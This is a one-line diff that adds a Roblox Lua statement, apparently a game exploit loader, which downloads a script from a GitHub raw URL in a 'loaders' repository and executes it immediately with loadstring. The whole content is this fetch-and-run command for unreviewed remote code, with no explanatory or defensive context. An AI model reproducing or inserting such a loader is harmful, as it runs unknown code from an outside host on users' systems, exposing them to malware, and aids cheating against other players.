@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/draw-spells-magic-arena-spam6-teie56z0gueerk.lua"))()
